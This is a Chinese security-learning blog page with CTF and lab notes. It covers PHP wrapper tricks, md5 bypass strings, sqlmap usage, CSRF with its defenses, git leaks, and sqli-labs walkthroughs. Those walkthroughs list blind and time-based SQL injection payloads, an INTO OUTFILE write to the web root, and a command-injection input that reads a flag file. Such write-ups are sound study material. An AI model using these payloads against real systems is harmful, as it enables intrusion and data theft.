<p>遇到php代码中有include($file)的，一般和 php://input或者php://filter有关，$file值如果是php://input，就要用post表单构造数据，如果是php://filter，就用下面的payload读取文件base64加密后的源代码，解密后查看源代码。</p>
<p>PHP://filter/read=convert.base64-encode/resource=文件名(如index.php)
 </p>
<p><b style="color:pink">5. 代码审计</b></p>
<p>需要多次动态调试来尝试，以及要关注里面出现的函数，出现在关键位置的函数一般都是有用的，搜索一下有没有相关的漏洞。</p>
<p>还有一些和数据处理有关的绕过，如md5函数结果相等（0ed+）的比较，以及strcmp(array,string)=null，除了遇到时多百度之外，平时也需要多积累到时候才能想到。</p>
<p>还有GET参数构造的时候如果传入的是数组要记得加[]，？txt[]=[1,2,3]，如果填?txt=[1,2,3]似乎不会被当做array处理。</p>
<p><b style="color:pink">6.编码</b></p>
<p>JS的几种编码（如JSFUCK）都可以在浏览器F12之后的控制台执行，这样可以省去找解密网站的时间。</p>
<p>html编码，base64编码，url编码等等都可以在burpsuite上的decoder栏解决，但是发现burpsuite有一点不好就是中文不能显示，不知道是不是字符编码没有配置好，找到一个网址：</p>
<p><a target="_blank" rel="noopener" href="https://emn178.github.io/online-tools/base64_decode.html">https://emn178.github.io/online-tools/base64_decode.html</a></p>
<p>可以解好几种，界面也很简洁。</p>
<p><b style="color:pink">7.SQL注入</b></p>
<p>最近搞清楚了布尔注入，盲注之类的意思，布尔注入就像一个只会告诉你对或错的机器人，然后你去问他问题从而解决问题，盲注是说不会有提示信息，虽然对数据库的操作依然存在，但是不论是否操作成功都不会告诉你。</p>
<p>a&gt;对一个注入语句记个笔记：</p>
<p>%df’ union select 1,database() %23 %df’ union select 1,string from sql5.key %23</p>
<p>%df是在编码为gbk的时候用于宽字节注入的；%23就是#，但是用#不能通过；还有可以直接用 union select 字段名 from 数据库名.表名 的方式获取字段的值。</p>
<p>b&gt;对用sqlmap进行手工注入的一些步骤记个笔记首先找到可以注入的点，比如找到网页的某个动态页面是可以注入用来显示信息的，然后将这个url用sqlmap来暴库爆表。</p>
<p>python sqlmap.py -u “url” –level 3 –batch –dbs python sqlmap.py -u “url” –level 3 –batch -D ctf –tables python sqlmap.py -u “url” –level 3 –batch -D ctf -T flag –columns –dump</p>
<p>–batch sqlmap不会询问你输入 全部默认确定</p>
<p>–level 3 指定等级，大于等于3的时候会涉及到http头注入的Referer字段</p>
<p>–（两个-）符号用于查询，比如–dbs用于查询所有的数据库，–tables用于查询所有的表，-（一个-）符号用于指定，比如-D ctf用于指定查询的是ctf数据库，-T flag用于指定查询的是flag表，–dump可以用来将表中字段的值显示出来。</p>
<p>c&gt;还有一些用union select来获得数据库信息的，链接</p>
<p><a target="_blank" rel="noopener" href="http://www.2cto.com/article/201208/151503.html">http://www.2cto.com/article/201208/151503.html</a></p>
<p>讲得很全面。</p>
<ol>
<li><p>@@version() MYSQL版本 </p>
</li>
<li><p>@@database() 当前数据库 </p>
</li>
<li><p>@@user() 当前用户 </p>
</li>
<li><p>@@datadir 当前数据库路径 </p>
</li>
<li><p>@@version_compile_os 操作系统版本</p>
</li>
<li><p>concat(str1,str2,…) 没有分隔符地连接字符串 </p>
</li>
<li><p>concat_ws(separator,str1,str2,…) 用分隔符连接字符串 </p>
</li>
<li><p>group_concat(str1,str2,…) 用逗号分隔字符串</p>
</li>
<li><p>查数据库名，用户名<br>union select 1,2,concat(user(),database(),version()),4,……,N –<br>（最后–用于注释掉后面sql语句避免出错）得到数据库名 </p>
</li>
<li><p>查表名： union select group_concat(0x0a,table_name),2<br>from information_schema.tables<br>where table_schema=库名十六进制#<br>（库名十六进制可以用database()代替） </p>
</li>
<li><p>查列名 union select group_concat(0x0a,column_name)<br>,2 from information_schema.columns<br>where table_schema=database() and table_name=’users’# （<br>也可以把表名改为十六进制编码0x7573657273） </p>
</li>
<li><p>查需要的信息（用户名和密码）<br>union select group_concat(distinct 0x0a,user_id,0x0a,first_name,0x0a,<br>last_name,0x0a,user,0x0a,password,0x0a),<br>2 from users #</p>
</li>
</ol>
<p>总结的都比较散碎也比较基础，以后积累的多了一些之后再来继续补充。</p>
<p>&lt;  用这个表示\u003c     &gt;用这个表示 \u003e </p>
<p> <br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/youyoui/p/8610068.html">https://www.cnblogs.com/youyoui/p/8610068.html</a> 序列化</p>
<p>1、当在一个网页上找不到任何信息时，要查看他有没有robots.txt 或者前面的备份文件</p>
<p>2、extract() 函数从数组中将变量导入到当前的符号表。通俗的讲 就是可以将键变成变量名，键值可以变成变量名的值</p>
<p>sha1（）和md5（）都可以用数组绕过 而md5加密后判断相等时只要是0e字符串都会返回true</p>
<p>QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904</p>
<p>3、file_get_contents（） 可以使用php://input传过去 再用post构建其里面的内容</p>
<p>include() 可以使用</p>
<p>PHP://filter/read=convert.base64-encode/resource=文件名(如index.php) 也可以使用上述的方法。
 </p>
<p>sql md5</p>
<p>看到这里的提交参数被MD5再组合进SQL查询语句，导致常规的注入手段几乎都失效了</p>
<p>但是注意到，MD5之后是hex格式，转化到字符串时如果出现’or’xxxx的形式，就会导致注入</p>
<p>这里提供一个抄来的字符串：ffifdyop</p>
<p>md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c</p>
<p>转成字符串为’or’6�]��!r,��b</p>
<p>从而完成了注入</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-zj" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/03/18/zj/" class="article-date">
  	<time datetime="2021-03-18T12:48:43.000Z" itemprop="datePublished">2021-03-18</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/03/18/zj/">
        CSRF
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><b style="color:pink">##0、CSRF的简介</b><br>CSRF（Cross-site request forgery）跨站请求伪造，由于目标站无token/referer限制，导致攻击者可以用户的身份完成操作达到各种目的。根据HTTP请求方式，CSRF利用方式可分为两种。<br><b style="color:pink">##1、CSRF的攻击原理</b><br>CSRF 百度上的意思是跨站请求伪造，其实最简单的理解我们可以这么讲，假如一个微博关注用户的一个功能，存在CSRF漏洞，那么此时黑客只需要伪造一个页面让受害者间接或者直接触发，然后这个恶意页面就可以使用受害者的微博权限去关注其他的人微博账户。CSRF只要被批量化利用起来其危害还是比较大的。<br><img src="/2021/03/18/zj/1.png"><br>可以看到这里有个Referer的信息，Referer也就是请求来源地址，也就是说这个请求是从<a target="_blank" rel="noopener" href="http://www.sina.com.cn/">http://www.sina.com.cn</a>  这里发起的。然后去掉Referer，去执行这个请求，发现这个请求仍然可以进行正常的搜索，那么就说明这个请求没有判断请求来源也就是Referer，在请求头部也没有发现存在token的迹象，那么可以判断此处存在CSRF，这个CSRF是没有任何危害d的。<br><b style="color:pink">##2、CSRF漏洞成因及分析</b><br><b style="color:blue">GET类型的CSRF</b><br>请求直接是个GET请求，然后请求中没有token验证参数，然后还有一个固定的变量可以被控制。这种是比较常见的一种CSRF漏洞。这种漏洞的检测方法很简单：网页操作某功能，抓包后，如果发现满足上面条件，然后再去页面测试下，基本就可以确定存在不存在CSRF漏洞了。<br>这种类型的CSRF一般是由于程序员安全意识不强造成的。GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以，一般会这样利用：<br><img src="/2021/03/18/zj/3.png"><br>在访问含有这个img的页面后，成功向<a target="_blank" rel="noopener" href="http://wooyun.org/csrf.php?xx=11">http://wooyun.org/csrf.php?xx=11</a>  发出了一次HTTP请求。所以，如果将该网址替换为存在GET型CSRF的地址，就能完成攻击了。<br><b style="color:blue">POST类型的CSRF</b><br>post请求中没有token参数，然后请求也没有验证referer信息。这种是存在CSRF情况最多的一种。这种漏洞的检测方法也很简单：网页操作某功能，抓包后，如果发现没有token等参数，然后就将referer信息设置为空，再次发包请求，如果请求成功了，就说明这里有CSRF漏洞。<br>这种类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的表单，如：<br><img src="/2021/03/18/zj/2.png"></p>
<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作<br><b style="color:blue">其他类型的CSRF</b><br>过基础认证的CSRF(常用于路由器):<br>POC:<br><img src="/2021/03/18/zj/4.png"><br>加载该图片后，路由器会给用户一个合法的SESSION，就可以进行下一步操作了。<br><b style="color:blue">##4、如何修复</b><br>针对CSRF的防范，有以下几点要注意：<br><b>关键操作只接受POST请求</b><br><b>验证码</b><br>CSRF攻击的过程，往往是在用户不知情的情况下构造网络请求。所以如果使用验证码，那么每次操作都需要用户进行互动，从而简单有效的防御了CSRF攻击。</p>
<p>但是如果你在一个网站作出任何举动都要输入验证码会严重影响用户体验，所以验证码一般只出现在特殊操作里面，或者在注册时候使用</p>
<p><b>检测refer</b><br>常见的互联网页面与页面之间是存在联系的，比如你在<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>  应该是找不到通往<a target="_blank" rel="noopener" href="http://www.google.com/">www.google.com</a>  的链接的，再比如你在论坛留言，那么不管你留言后重定向到哪里去了，之前的那个网址一定会包含留言的输入框，这个之前的网址就会保留在新页面头文件的Referer中</p>
<p>通过检查Referer的值，我们就可以判断这个请求是合法的还是非法的，但是问题出在服务器不是任何时候都能接受到Referer的值，所以Refere Check 一般用于监控CSRF攻击的发生，而不用来抵御攻击。</p>
<p><b>Token</b><br>目前主流的做法是使用Token抵御CSRF攻击。下面通过分析CSRF 攻击来理解为什么Token能够有效</p>
<p>CSRF攻击要成功的条件在于攻击者能够预测所有的参数从而构造出合法的请求。所以根据不可预测性原则，我们可以对参数进行加密从而防止CSRF攻击。</p>
<p>另一个更通用的做法是保持原有参数不变，另外添加一个参数Token，其值是随机的。这样攻击者因为不知道Token而无法构造出合法的请求进行攻击。</p>
<p>Token 使用原则</p>
<ol>
<li>Token要足够随机————只有这样才算不可预测
</li><li>Token是一次性的，即每次请求成功后要更新Token————这样可以增加攻击难度，增加预测难度
</li><li>Token要注意保密性————敏感操作使用post，防止Token出现在URL中
</li><li>复制代码
</li></ol>
<b style="color:blue">##5、测试CSRF中注意的问题</b>
如果同域下存在xss的话，除了验证码，其他的方式都无法防御这个问题。

<p>有个程序后端可能是用REQUEST方式接受的，而程序默认是POST请求，其实改成GET方式请求也可以发送过去，存在很严重的隐患。</p>
<p>当只采用refer防御时，可以把请求中的修改成如下试试能否绕过：</p>
<p>原始refer：<a target="_blank" rel="noopener" href="http://test.com/index.php">http://test.com/index.php</a></p>
<p>测试几种方式（以下方式可以通过的话即可能存在问题）：</p>
<ul>
<li>http://test.com.attack.com/index.php
</li><li>http://attack.com/test.com/index.php
</li><li>[空]
</li><li>复制代码
</li></ul>

<p>refer为空构造的方法：<br><img src="/2021/03/18/zj/5.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-web" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/03/13/web/" class="article-date">
  	<time datetime="2021-03-13T07:59:05.000Z" itemprop="datePublished">2021-03-13</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/03/13/web/">
        攻防世界练习
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1>simp_php</h1>

<p>题目如下：<br><img src="/2021/03/13/web/q1.png"><br>根据题目可知，flag1==0且a不为0；想得到flag2，b不为数字或字符串，is_numeric() 函数用于检测变量是否为数字或数字字符串。<br>最终<br>payload:?a=0a&amp;b=123456%00;<br><img src="/2021/03/13/web/q2.png"><br>得到flag！</p>
<h1>Get Post</h1>

<p>题目：<br><img src="/2021/03/13/web/a1.png"><br>根据提示，get传入?a=1<br>在根据提示post传入b=2<br><img src="/2021/03/13/web/a2.png"><br>euuuu好简单，是我的打开方式不对/??</p>
<h1>xff_referer</h1>

<p>题目显示ip地址必须为123.123.123<br>采用bp抓包：<br>X-Forwarded-For: 123.123.123.123<br>提示说必须来自<a target="_blank" rel="noopener" href="https://www.google.com/">https://www.google.com</a><br>Referer: <a target="_blank" rel="noopener" href="https://www.google.com/">https://www.google.com</a><br>得到flag！</p>
<h1>webshell</h1>

<p>打开题目，一句话木马，才一年采用蚁剑<br><img src="/2021/03/13/web/11.png"><br>点击添加的地址，进入之后<br><img src="/2021/03/13/web/222.png"><br>得到flag！</p>
<h1>command_execution</h1>

<p>打开题目：<br><img src="/2021/03/13/web/p1.png"><br>ping!!<br>连接本机127.0.0.1<br><img src="/2021/03/13/web/p2.png"><br>成功回显，试试其他命令127.0.0.1 &amp;&amp; ls<br>可以执行，那么我们直接<br><img src="/2021/03/13/web/1.png"><br>127.0.0.1 &amp;&amp; cat /home/flag.txt<br><img src="/2021/03/13/web/2.png"><br>得到flag</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-fan" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/03/10/fan/" class="article-date">
  	<time datetime="2021-03-10T11:59:14.000Z" itemprop="datePublished">2021-03-10</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/03/10/fan/">
        反序列化&amp;web信息搜集知识点总结
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1>反序列化</h1>

<p><b style="color:red">反序列化定义：</b><br>（反）序列化给我们传递对象提供了一种简单的方法。serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象，在PHP应用中，序列化和反序列化一般用做缓存，比如session缓存，cookie等。在php序列化格式（即数据在传输时防止格式类型丢失,先进行打包即序列化,完成传输后解包即反序列化）<br><b style="color:yellow">反序列化原型：</b>string serialize ( mixed $value )<br><b style="color:pink">例子：</b><br>输入内容：<br><img src="/2021/03/10/fan/q1.png"><br>输出结果：<br><img src="/2021/03/10/fan/q2.png"><br>序列化对不同格式字符串结果不同，如下：</p>
<ul>
<li>
string:s:size:value
</li><li>
integer:i:value
</li><li>
boolean:b:value(即0或1)
</li><li>
array:a:size:{key:value;key:value}
</li><li>
object:o:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;}
</li></ul>

<p>注：序列化对象时，不会保存常量的值。对于父类中的变量，则会保留。<br><b style="color:blue">反序列化函数：</b>mixed unserialize ( string $str )<br>unserialize()反序列化函数用于将单一的已序列化的变量转换回 PHP 的值。</p>
<ul>
<li>如果传递的字符串不可解序列化，则返回 FALSE，并产生一个E_NOTICE
</li><li>返回的是转换之后的值，可为integer``float、string、array或object
</li><li>若被反序列化的变量是一个对象，在成功重新构造对象之后，PHP会自动地试图去调用__wakeup()成员函数（如果存在的话）
</li></ul>

<p><b style="color:pink">例子：</b><br>输入内容：<br><img src="/2021/03/10/fan/q3.png"><br>输出结果：<br><img src="/2021/03/10/fan/q4.png"><br>__wakeup()函数在对象被构建以后执行，所以$this-&gt;username的值不为空(为空则会绕过此函数，或反序列化时数据被改动也会绕过）<br>会尽量将变量值进行匹配并复制给序列化后的对象<br><b style="color:yellow">&gt;常见的PHP魔术方法：</b></p>
<ul>
<li>__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。
</li><li>__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。
</li><li>__toString：当对象被当做一个字符串使用时调用。
</li><li>__sleep:序列化对象之前就调用此方法(其返回需要一个数组)
</li><li>__wakeup:反序列化恢复对象之前调用该方法
</li><li>__call:当调用对象中不存在的方法会自动调用该方法。
</li><li>__get:在调用私有属性的时候会自动执行
</li><li>__isset()在不可访问的属性上调用isset()或empty()触发
</li><li>__unset()在不可访问的属性上使用unset()时触发
</li></ul>

<p><b style="color:red">php反序列化漏洞：</b><br>php反序列化漏洞又称对象注入，可能会导致注入，远程代码执行等安全问题的发生。</p>
<p>PHP反序列化漏洞产生的原因：</p>
<p>如果一个php代码使用了unserialize函数去调用某一类，该类中会自动执行一些<br>自定义的magic method，这些magicmethod中如果包含了一些危险操作，或者这<br>些magic method会去调用类中其他危险操作的函数，如果这些危险操作是我们可<br>控的，那么久可以进行一些不可描述的操作了。</p>
<p><b style="color:green">总结：</b><br>当存在php反序列化漏洞时，找一个可控的反序列化函数，通过这个函数去调用一些类，在这些类中可能存在一些魔法函数，在这些魔法函数中可能有一些我们可控的危险操作，我们利用这些危险操作，让程序执行反序列化函数时触发这些的危险操作。</p>
<h1>web信息收集</h1>

<p><b style="color:pink">敏感目录</b><br><b style="color:pink">git泄露</b><br>Git是一个开源的分布式版本控制系统，在执行git init初始化目录的时候，会在当前目录下自动创建一个.git目录，用来记录代码的变更记录等。发布代码的时候，如果没有把.git这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码。</p>
<p>1、常规git泄露</p>
<p>使用scrabble或者其他工具读出源码即可<br>./scrabble <a href="http://example.com/">http://example.com/</a></p>
<p>2、git回滚<br>git会记录每次的提交的修改，在比赛中拿到的flag文件有可能是被删除或者覆盖过的，这时可以利用git reset –hard HEAD^来恢复到以前的版本<br>也可以用git log –stat查看commit修改了哪些文件，再用git diff HEAD commit-id</p>
<p>3、git分支<br>每次提交git都会将她们串为一条时间线，这条时间线就是一条分支，git允许有多条分支，则需要的flag文件有可能不在主分支即master上，而 git log只能看到当前分支的。<br>对于获取其他的分支、tag，都可以从/.git/refs/heads、/.git/refs/tag里面拿到最新的commit对象id，然后就是顺着这个可以爬到parent commit<br>假设获取master，最新的commit的object id可以在/.git/refs/heads/master获取到</p>
<p>4、其他利用方式<br>从.git/config可能有access_token信息， 从而访问这个用户的其他的仓库<br>在访问.git的时候有可能会返回403，此时可以试着访问.git/config，若有文件返回则有可能存在泄露。</p>
<p><b style="color:pink">SVN泄露</b><br>SVN是一个开放源代码的版本控制系统。在使用SVN管理本地代码过程中，会自动生成一个名为.svn的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，可以利用.svn/entries文件，获取到服务器源码。<br>可以用seay-svn或者dvcs-ripper工具获取</p>
<p><b style="color:pink">HG泄露</b><br>Mercurial 是一种轻量级分布式版本控制系统，使用hg init的时候会生成.hg。<br>漏洞利用工具： dvcs-ripper</p>
<p><b style="color:pink">敏感备份文件</b><br>通过敏感备份文件，有可能能获得一些源码</p>
<p>1、gedit</p>
<p>Linux下用gedit编写文件并保存后会生成一个文件名格式为：”原文件名~“的备份文件</p>
<p>2、vim</p>
<p>当使用vim编辑文件第一次意外退出时会生成一个文件名格式为：“.文件名.swp”的备份文件，可使用vim -r 文件名来恢复</p>
<p>第二次意外退出*.swo，第三次为*.swn</p>
<p>3、常规文件</p>
<p>【1】robots.txt:敏感目录和CMS版本信息<br>【2】readme.md:CMS版本信息，github地址<br>【3】格式如<a target="_blank" rel="noopener" href="http://www.zip/rar/tar.gz:%E7%BD%91%E7%AB%99%E5%A4%87%E4%BB%BD%E6%BA%90%E7%A0%81">www.zip/rar/tar.gz:网站备份源码</a><br><b style="color:pink">Banner识别</b><br>1、利用CMS指纹库<br>2、在线识别<br>3、利用已有工具wappalyer，可以通过python安装库，也可以在浏览器装插件<br>4、还可以通过报错404和302来查看错误信息</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-mz" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/02/26/mz/" class="article-date">
  	<time datetime="2021-02-26T05:52:18.000Z" itemprop="datePublished">2021-02-26</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/26/mz/">
        sqli-labs靶场8-10
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1>知识点</h1>

<p>函数</p>
<ul>
<li>length()函数                返回字段/结果/函数的长度，length(column_name)
</li><li>length(database())            即返回当前数据库名长度
</li><li>substr()函数             截取字符段长度
</li><li>例如：substr（abcd，1，1） 从第一位开始（也就是从a开始）截取一个字符，就是a
</li><li>  substr（abcd，2，1）     从第二位开始，截取一个字符，就是b
</li><li>substr（abcd，2，3）       从第二位开始，截取三个字符，就是bcd
</li><li>if()函数                条件判断函数
</li><li>if(a,b,c)      if判断句，a为条件，b、c为执行语句；如果a为真就执行b，a为假就执行c;
</li><li>sleep()函数            网页延迟n秒后，输出结果
</li><li>left（）函数             从左边数，取几个数
</li><li>例如：left（abcdef，3）  取3位左边的数，就是abc
</li></ul>

<p><img src="/2021/02/26/mz/b1.png"></p>
<h1>Less-8（基于布尔的盲注）</h1>

<p><b style="color:pink">基于布尔的盲注：</b><br>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;<br>$result=mysql_query($sql);<br>$row = mysql_fetch_array($result);<br>if($row){<br>      echo ‘You are in………..’;<br>}else{<br>}<br><b style="color:pink">payload:</b></p>
<ol>
<li>Less-8/?id=1' and (ascii(substr((select database()) ,1,1))) = 115--+
</li><li>Less-8/?id=1' and (length(database())) = 8 --+ //数库名长度=8
</li></ol>

<p><b style="color:pink">盲注得到数据库名：security</b></p>
<ol>
<li>Less-8/?id=1' and (ascii(substr((select database()) ,1,1))) = 115 --+
</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,2,1))) = 101 --+
</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,3,1))) = 99 --+
</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,4,1))) = 117 --+
</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,5,1))) = 114 --+
</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,6,1))) = 105 --+
</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,7,1))) = 116 --+
</li><li>Less-8/?id=1' and (ascii(substr((select database()) ,8,1))) = 121 --+  
</li></ol>

<p><b style="color:pink">接着判断表名长度：</b><br>Less-8/?id=1’ and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 6 –+<br><b style="color:pink">接下来判断表名为user：</b><br>?id=1’ and (length((select table_name from information_schema.tables where table_schema=database() limit 3,1))) = 5 –+</p>
<ol>
<li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,1,1))) = 117 --+

</li><li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,2,1))) = 115 --+

</li><li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,3,1))) = 101 --+

</li><li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,4,1))) = 114 --+

</li><li>Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,5,1))) = 115 --+
</li></ol>

<p>其余的用同样的盲注方法得到结果</p>
<h1>Less-9（基于时间盲注1）</h1>

<p><b style="color:purple">一、判断注入点</b><br>?id=1’)and (sleep(4)) –+ （耗时2s，这是正常的页面，没有闭合的页面）<br>?id=1’and (sleep(4)) –+ （耗时6s，因为正常页面需要2s，所以闭合之后消耗的时间为又增加了4s，所以是6s）<br>时间注入判断注入点就用这个<br>由于不报错，所以判断注入点，就是用sleep延迟函数<br>根据第8关的思想我们先判断数据库的长度</p>
<ul>
<li>?id=1' and if (length(database()) = 8 ,sleep(4),1)--+
</li></ul>

<p>数据库的长度为8，就延时反应4秒<br>知道了数据库的长度，那么我们就进行爆库;<br>?id=1’ and If(ascii(substr(database(),1,1))=115,sleep(5),1)–+<br>说明第一位是 s （ascii 码是 115）<br>?id=1’ and If(ascii(substr(database(),2,1))=101,sleep(5),1)–+<br>说明第一位是 e （ascii 码是 101）<br><b style="color:purple">二、爆表名</b><br>?id=1’ and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 3,1),1,1))=117,sleep(4),1)–+ （u）<br>?id=1’ and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 3,1),2,1))=115,sleep(4),1)–+ （s）<br>以此类推<br>————————————————<br>?id=1’ and If(ascii(substr((select column_name from information_schema.columns where table_name=’users’ and table_schema=database() limit 0,1),1,1))=105,sleep(4),1)–+</p>
<p>猜测 users 表的第一个列的第一个字符是 i，<br>以此类推，我们得到列名是 id，username，password<br><b style="color:purple">三、爆数据</b><br>?id=1’ and If(ascii(substr((select username from users limit 0,1),1,1))=68,sleep(4),1)–+<br>以此类推，我们得到数据库 username，password 的所有内容</p>
<h1>Less-10（基于时间盲注2）</h1>

<p>和第九关一样，基于时间盲注的注入<br>双引号注入：<br>系统的来判断一下注入点</p>
<ul>
<li>?id=1" and (sleep(3))--+  （有延迟）
</li><li>?id=1’ and (sleep(3))--+   (无延迟)
</li></ul>

<p>接下来和第九关步骤一样，得到想要的内容</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-bc" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/02/22/bc/" class="article-date">
  	<time datetime="2021-02-22T05:11:15.000Z" itemprop="datePublished">2021-02-22</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/22/bc/">
        sqli-labs靶场6-7
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1>知识点</h1>
<h3>outfile语句</h3>

<p>这里需要注意的是outfile语句在MySql中，into outfile函数的权限是很容易忽略的一个点，其中涉及到了几个关键的变量，分别是secure_file_priv, datadir 和 PrivateTmp。下面简单介绍一下这三个变量。<br>（1）secure_file_priv<br>这个参数主要用来限制数据的导入导出效果（load data, into outfile等）。如果这个参数值为NULL，那么mysql会禁止用户进行导入导出操作；如果这个参数是一个具体的目录名，那么数据的导入导出只能在该目录下进行；如果这个参数为空，那么导入导出的文件位置将不受限制。<br>该参数的设置，可以在my.cnf配置文件中修改，而在搭建的SQLi-Labs环境中下需要在配置的phpstudy环境中修改，具体修改方法因配置环境而异，此处不作讲解。<br>（2）datadir<br>这个参数是MySql存放数据文件的目录，也是导入导出操作的相对路径<br>（3）PrivateTmp<br>使用Systemd进程作为启动进程的linux系统，其子进程都会有一个属性叫PrivateTmp，用于设置是否使用私有的tmp目录。</p>
<h1>Less-6</h1>
<h3>界面</h3>

<p><img src="/2021/02/22/bc/b1.png"></p>
<h3>测试</h3>

<p>通过测试可知：?id=1”<br><img src="/2021/02/22/bc/b2.png"></p>
<ul>
<li>url + ?id=1" order by 4--+ //报错
</li></ul>

<p><img src="/2021/02/22/bc/b3.png"><br>可知字段数为3，页面有布尔类型状态，所以用布尔盲注，页面没有回显不能用联合查询，页面没有报错信息不能用报错注入。<br>其余步骤和第五关的一模一样，只是将单引号变为双引号<br>最终payload：?id=1” and extractvalue(1,concat(0x23,(select username from users order by id limit 2,1),0x23))–+<br>得到所有数据：<br><img src="/2021/02/22/bc/b4.png"></p>
<h1>Less-7</h1>
<h3>界面</h3>

<p><img src="/2021/02/22/bc/c1.png"></p>
<h3>测试</h3>

<p>首先，按照提示输入id参数，尝试寻找注入点<br>构建url: …/Less-7/?id=1<br><img src="/2021/02/22/bc/c2.png"><br>页面显示正常，提示使用outfile语句<br>构建url：…/Less-7/?id=1’<br><img src="/2021/02/22/bc/c3.png"><br>页面报错，但是没有提示报错信息,网站存在注入点,通过不断尝试，我们猜测到了原有sql语句的闭合方式<br>构建url：…/Less-7/?id=1’)) –+<br>页面显示正常<br>那么可以使用union联合查询构造语句：</p>
<ul>
<li>../Less-7/?id=1")) union select 1,2,3 --(( "
</li></ul>

<p>此时的查询语句；select * from users where id=((‘1’)) union select 1,2,3 –(( ‘)<br>在linux中，网站一般是放在/var/www/html目录里，这里我们dump一个文件到这个目录，名字是hacker.txt。<br>构造语句：</p>
<ul>
<li>../Less-7/?id=1')) union select 1,'hacker by xuxinhen',3 into outfile '/var/www/html/hacker.txt' -- (( '
</li></ul>

<p><img src="/2021/02/22/bc/c4.png"><br>虽然报错，但是文件已经生成</p>
<p>打开链接：</p>
<p>…/hacker.txt即可找到</p>
<p>此时的sql语句为：</p>
<ul>
<li>select * from users where id=(('1')) union select 1,'hacker by xuxinhen',3 into outfile '/var/www/html/hacker.txt' -- (( '
</li></ul>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-hack" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/02/15/hack/" class="article-date">
  	<time datetime="2021-02-15T11:56:57.000Z" itemprop="datePublished">2021-02-15</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/02/15/hack/">
        25-buu练习[BJDCTF 2nd]old-hack 1
        
      </a>
